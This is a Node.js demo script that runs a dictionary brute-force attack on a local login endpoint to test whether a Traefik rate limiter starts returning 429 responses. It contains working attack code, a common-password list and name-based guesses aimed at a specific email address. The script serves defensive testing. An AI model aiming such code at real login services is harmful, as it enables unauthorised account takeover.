#!/usr/bin/env node

/**
 * Brute-Force Login Attack Demo
 * ──────────────────────────────
 * Simulates an attacker trying to guess the password of a known account by
 * rapidly sending login requests with common/dictionary passwords.
 *
 * The demo is intentionally limited to ~25 attempts — enough to exhaust the
 * Traefik rate-limiter's token bucket (burst=10, average=2/10s) and observe
 * the transition from "401 Unauthorized" to "429 Too Many Requests", but NOT
 * enough to constitute a denial-of-service flood.
 *
 * Prerequisites:
 *   - The Spotlite Docker Compose stack must be running (`docker compose up`).
 *   - The target user account must exist in the database.
 *
 * Usage:
 *   node brute-force.mjs
 *   BASE_URL=http://localhost:3000 npm start
 */

// ─── Configuration ───────────────────────────────────────────────────────────

const BASE_URL = "http://localhost:3000";
const LOGIN_ENDPOINT = `${BASE_URL}/api/users/login`;
const TARGET_EMAIL = "teodora.nedic123@gmail.com";

/** Delay (ms) between consecutive attempts — keeps it realistic, not a DoS. */
const DELAY_MS = 80;

// ─── Dictionary of common passwords ─────────────────────────────────────────

const PASSWORD_DICTIONARY = [
  // Classic worst-of-the-worst passwords
  "password",
  "123456",
  "123456789",
  "qwerty",
  "abc123",
  "password1",
  "admin",
  "letmein",
  "welcome",
  "monkey",
  // Targeted guesses (name-based)
  "teodora",
  "Teodora",
  "teodora123",
  "Teodora123",
  "teodora!",
  "nedic123",
  // More dictionary entries
  "iloveyou",
  "sunshine",
  "princess",
  "football",
  "shadow",
  "master",
  "dragon",
  "trustno1",
  "batman",
];

// ─── ANSI helpers ────────────────────────────────────────────────────────────

const c = {
  reset: "\x1b[0m",
  bold: "\x1b[1m",
  dim: "\x1b[2m",
  red: "\x1b[31m",
  green: "\x1b[32m",
  yellow: "\x1b[33m",
  cyan: "\x1b[36m",
  magenta: "\x1b[35m",
  bgRed: "\x1b[41m",
  bgYellow: "\x1b[43m",
  bgGreen: "\x1b[42m",
};

// ─── Utilities ───────────────────────────────────────────────────────────────

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function statusColor(status) {
  if (status === 200) return c.green;
  if (status === 429) return c.yellow;
  if (status >= 400 && status < 500) return c.red;
  return c.magenta;
}

function statusLabel(status) {
  if (status === 200) return "  OK  ";
  if (status === 401) return " AUTH ";
  if (status === 429) return " RATE ";
  if (status === 403) return "FORBID";
  return ` ${status} `;
}

function fmtMs(ms) {
  return `${ms.toString().padStart(5)}ms`;
}

// ─── Main ────────────────────────────────────────────────────────────────────

async function main() {
  console.log();
  console.log(
    `${c.bold}${c.red}╔══════════════════════════════════════════════════════════════╗${c.reset}`,
  );
  console.log(
    `${c.bold}${c.red}║           ⚠  BRUTE-FORCE LOGIN ATTACK DEMO  ⚠               ║${c.reset}`,
  );
  console.log(
    `${c.bold}${c.red}╚══════════════════════════════════════════════════════════════╝${c.reset}`,
  );
  console.log();
  console.log(`${c.cyan}Target:${c.reset}    ${TARGET_EMAIL}`);
  console.log(`${c.cyan}Endpoint:${c.reset}  ${LOGIN_ENDPOINT}`);
  console.log(
    `${c.cyan}Passwords:${c.reset} ${PASSWORD_DICTIONARY.length} dictionary entries`,
  );
  console.log(`${c.cyan}Delay:${c.reset}     ${DELAY_MS}ms between requests`);
  console.log();
  console.log(
    `${c.dim}This simulates an attacker trying common passwords against a known`,
  );
  console.log(
    `email address.  The Traefik API gateway enforces a global rate limit`,
  );
  console.log(
    `(burst=10, refill=2 tokens / 10s).  Once the bucket is drained the`,
  );
  console.log(
    `gateway returns 429 Too Many Requests — blocking further attempts.${c.reset}`,
  );
  console.log();

  // ── Header ──
  console.log(
    `${c.bold} #   ${pad("Password", 20)} Status   Latency  Response${c.reset}`,
  );
  console.log(`${c.dim}${"─".repeat(75)}${c.reset}`);

  const results = [];
  let firstRateLimited = -1;

  for (let i = 0; i < PASSWORD_DICTIONARY.length; i++) {
    const password = PASSWORD_DICTIONARY[i];
    const attempt = i + 1;

    const start = performance.now();
    let status, body;

    try {
      const res = await fetch(LOGIN_ENDPOINT, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: TARGET_EMAIL, password }),
      });
      status = res.status;
      body = await res.text();
    } catch (err) {
      status = 0;
      body = err.message;
    }

    const elapsed = Math.round(performance.now() - start);

    // Truncate body for display
    const shortBody = body.length > 40 ? body.slice(0, 40) + "…" : body;

    const sc = statusColor(status);
    console.log(
      `${c.dim}${String(attempt).padStart(2)}.${c.reset}  ` +
        `${pad(mask(password), 20)} ` +
        `${sc}${c.bold}${statusLabel(status)}${c.reset}  ` +
        `${c.dim}${fmtMs(elapsed)}${c.reset}  ` +
        `${c.dim}${shortBody}${c.reset}`,
    );

    results.push({ attempt, password, status, elapsed, body: shortBody });

    if (status === 429 && firstRateLimited === -1) {
      firstRateLimited = attempt;
    }

    if (i < PASSWORD_DICTIONARY.length - 1) {
      await sleep(DELAY_MS);
    }
  }

  // ── Summary ──
  console.log();
  console.log(`${c.dim}${"─".repeat(75)}${c.reset}`);
  console.log(`${c.bold}Summary${c.reset}`);
  console.log();

  const denied = results.filter((r) => r.status === 401).length;
  const rateLimited = results.filter((r) => r.status === 429).length;
  const succeeded = results.filter((r) => r.status === 200).length;
  const errors = results.filter(
    (r) => r.status === 0 || r.status >= 500,
  ).length;

  console.log(`  ${c.red}✗${c.reset} Denied (401):          ${denied}`);
  console.log(
    `  ${c.yellow}⚡${c.reset} Rate-limited (429):    ${rateLimited}`,
  );
  console.log(`  ${c.green}✓${c.reset} Succeeded (200):       ${succeeded}`);
  if (errors > 0) {
    console.log(`  ${c.magenta}⚠${c.reset} Errors:                ${errors}`);
  }
  console.log();

  if (rateLimited > 0) {
    console.log(
      `${c.bgYellow}${c.bold} RATE LIMITING DETECTED ${c.reset}  ` +
        `Traefik started blocking at attempt #${firstRateLimited}.`,
    );
    console.log(
      `${c.dim}  The token bucket (burst=10) was exhausted after the initial burst.`,
    );
    console.log(
      `  Subsequent requests were rejected with 429 — the attack is effectively`,
    );
    console.log(`  mitigated by the API gateway.${c.reset}`);
  } else {
    console.log(
      `${c.bgRed}${c.bold} NO RATE LIMITING OBSERVED ${c.reset}  ` +
        `All ${results.length} attempts went through without a 429.`,
    );
    console.log(
      `${c.dim}  This means the rate-limiter may not be configured or the burst` +
        ` bucket was large enough to absorb all attempts.${c.reset}`,
    );
  }

  if (succeeded > 0) {
    console.log();
    console.log(
      `${c.bgRed}${c.bold} PASSWORD FOUND ${c.reset}  ` +
        `The attacker guessed the password!  This should not happen with` +
        ` a strong password.`,
    );
  } else {
    console.log();
    console.log(
      `${c.bgGreen}${c.bold} PASSWORD NOT FOUND ${c.reset}  ` +
        `None of the ${PASSWORD_DICTIONARY.length} dictionary passwords` +
        ` matched — the account uses a strong password.`,
    );
  }

  console.log();
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

/** Pad or truncate a string to exactly `len` characters. */
function pad(str, len) {
  return str.length >= len
    ? str.slice(0, len)
    : str + " ".repeat(len - str.length);
}

/** Partially mask a password for display: show first 3 chars, mask the rest. */
function mask(pw) {
  if (pw.length <= 3) return pw;
  return pw.slice(0, 3) + "*".repeat(pw.length - 3);
}

// ─── Run ─────────────────────────────────────────────────────────────────────

main().catch((err) => {
  console.error(`${c.red}Fatal:${c.reset}`, err);
  process.exit(1);
});
